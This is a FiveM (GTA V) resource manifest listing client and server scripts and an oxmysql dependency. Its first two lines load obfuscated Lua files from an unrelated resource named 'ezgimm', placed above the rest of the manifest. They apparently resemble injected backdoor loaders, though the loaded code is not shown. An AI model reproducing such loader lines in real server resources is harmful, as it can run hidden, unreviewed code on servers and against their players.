shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
author 'ssss' 
fx_version 'cerulean'
game 'gta5'
lua54 'yes'
version '1.0.0'
client_scripts {
  'client/main.lua'
}
server_scripts {
  '@oxmysql/lib/MySQL.lua',
  'server/main.lua'
}
escrow_ignore {
  "server/**"
}
dependency '/assetpacks'